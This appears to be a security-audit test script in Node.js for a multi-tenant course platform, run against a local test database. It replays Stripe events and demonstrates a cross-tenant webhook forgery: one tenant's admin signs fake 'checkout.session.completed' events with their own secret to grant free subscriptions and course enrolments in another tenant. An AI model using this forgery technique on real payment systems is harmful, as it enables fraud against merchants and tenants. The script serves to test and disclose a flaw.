import { execSync } from 'node:child_process';
import { stripe, sleep } from './lib.mjs';
import { api, sign, load, save, log, HOST_DEMO, HOST_SMOKE, PG_CONTAINER } from './c-lib.mjs';
const s = load();
const sql = (q) =>
  execSync(
    `docker exec ${PG_CONTAINER} psql -U didacta_test -d didacta_test -t -A -F " | " -c "${q.replace(/"/g, '\\"')}"`,
  )
    .toString()
    .trim();
const post = (path, raw, secret, host) =>
  api(path, {
    method: 'POST',
    raw,
    host,
    headers: { 'Content-Type': 'application/json', 'Stripe-Signature': sign(raw, secret) },
  });
const subs = () =>
  sql(
    `select s.status, u.email, s.stripe_subscription_id, t.slug from mod_subscriptions_subscription s join "user" u on u.id=s.user_id join tenant t on t.id=s.tenant_id order by s.created_at`,
  );

// --- A. membresía real pagada: entregar sus eventos al webhook de suscripciones
const cs = await stripe('GET', '/v1/checkout/sessions/' + s.subSessionId);
log('sesion membresia', {
  status: cs.status,
  payment_status: cs.payment_status,
  subscription: cs.subscription,
  amount_total: cs.amount_total,
});
if (cs.status === 'complete') {
  const evs = await stripe('GET', '/v1/events', { limit: 60 });
  const mine = evs.data
    .filter((e) => {
      const o = e.data.object;
      return (
        o.id === cs.id ||
        o.id === cs.subscription ||
        o.subscription === cs.subscription ||
        o.parent?.subscription_details?.subscription === cs.subscription
      );
    })
    .reverse();
  for (const ev of mine) {
    if (
      ![
        'checkout.session.completed',
        'customer.subscription.created',
        'customer.subscription.updated',
        'invoice.paid',
        'invoice.payment_succeeded',
      ].includes(ev.type)
    )
      continue;
    const raw = JSON.stringify(ev);
    const r = await post('/api/v1/modules/subscriptions/webhook', raw, s.demoWhsec, HOST_DEMO);
    log('  entregado ' + ev.type, { status: r.status, err: r.body?.message });
  }
  await sleep(3000);
  log('suscripciones tras el pago real', subs());
  log(
    'facturas guardadas',
    sql(`select amount, currency, paid_at is not null as pagada from mod_subscriptions_invoice`),
  );
}

// --- B. CRUCE ENTRE AULAS: el admin de «e2e-smoke» firma con SU secreto un evento que nombra al tenant «demo»
const si = await api('/api/v1/auth/signin', {
  method: 'POST',
  host: HOST_SMOKE,
  body: {
    tenantSlug: 'e2e-smoke',
    email: 'e2e-smoke-admin@example.test',
    password: 'E2eAdminPassword123!',
  },
});
const atk = si.body.tokens.accessToken;
const smokeTenant = si.body.user.tenantId;
const ATK_SECRET = 'whsec_secreto_del_otro_creador';
const put = await api('/api/v1/admin/tenant-settings/stripe', {
  method: 'PUT',
  bearer: atk,
  host: HOST_SMOKE,
  body: { secretKey: 'sk_test_clave_inventada_no_valida', webhookSecret: ATK_SECRET },
});
log('otro creador guarda SUS credenciales (clave inventada)', {
  status: put.status,
  tenant_distinto: smokeTenant !== s.demoTenantId,
});
const ts = Date.now();
const forged = JSON.stringify({
  id: `evt_forjado_${ts}`,
  object: 'event',
  type: 'checkout.session.completed',
  livemode: false,
  created: Math.floor(ts / 1000),
  data: {
    object: {
      id: `cs_forjada_${ts}`,
      object: 'checkout.session',
      mode: 'subscription',
      status: 'complete',
      payment_status: 'paid',
      subscription: `sub_forjada_${ts}`,
      customer: 'cus_forjado',
      customer_details: { email: 'intruso+auditoria@example.com', name: 'Intruso' },
      metadata: { membership: '1', tenantId: s.demoTenantId, planId: s.planId },
    },
  },
});
const ctrl = await post('/api/v1/modules/subscriptions/webhook', forged, ATK_SECRET, HOST_DEMO);
log('CONTROL: mismo evento contra el dominio de la víctima', {
  status: ctrl.status,
  code: ctrl.body?.code,
});
const hit = await post('/api/v1/modules/subscriptions/webhook', forged, ATK_SECRET, HOST_SMOKE);
log('evento forjado contra el dominio PROPIO del otro creador', {
  status: hit.status,
  body: hit.body,
});
await sleep(3000);
log('suscripciones tras el evento forjado', subs());

// --- C. variante curso suelto: pedido PENDIENTE de la víctima completado sin pagar
const stamp = Date.now();
const su = await api('/api/v1/auth/signup', {
  method: 'POST',
  body: {
    tenantSlug: 'demo',
    email: `intruso2+${stamp}@example.com`,
    password: 'IntrusoPrueba123!',
    name: 'Intruso Dos',
  },
});
log('alta de alumno en el aula víctima', { status: su.status, err: su.body?.message });
const stok = su.body?.tokens?.accessToken;
if (stok) {
  const co = await api(`/api/v1/modules/billing/checkout/${s.courseId}`, {
    method: 'POST',
    bearer: stok,
    body: {},
  });
  log('checkout logueado (devuelve orderId)', {
    status: co.status,
    orderId: co.body?.orderId,
    err: co.body?.message,
  });
  if (co.body?.orderId) {
    const f2 = JSON.stringify({
      id: `evt_forjado2_${stamp}`,
      object: 'event',
      type: 'checkout.session.completed',
      livemode: false,
      created: Math.floor(stamp / 1000),
      data: {
        object: {
          id: `cs_forjada2_${stamp}`,
          object: 'checkout.session',
          mode: 'payment',
          status: 'complete',
          payment_status: 'paid',
          amount_total: 4900,
          payment_intent: `pi_forjado_${stamp}`,
          client_reference_id: co.body.orderId,
          customer_details: { email: `intruso2+${stamp}@example.com` },
          metadata: {
            tenantId: s.demoTenantId,
            courseId: s.courseId,
            productId: s.productId,
            orderId: co.body.orderId,
          },
        },
      },
    });
    const h2 = await post('/api/v1/modules/billing/webhook', f2, ATK_SECRET, HOST_SMOKE);
    log('evento de curso forjado', { status: h2.status, body: h2.body });
    await sleep(3000);
    log(
      'pedido de la víctima',
      sql(
        `select status, amount_paid, stripe_payment_intent_id from mod_billing_order where id='${co.body.orderId}'`,
      ),
    );
    log(
      'matrículas del curso',
      sql(
        `select e.status, e.source, u.email from mod_learning_enrollment e join "user" u on u.id=e.user_id where e.course_id='${s.courseId}'`,
      ),
    );
  }
}
save(s);
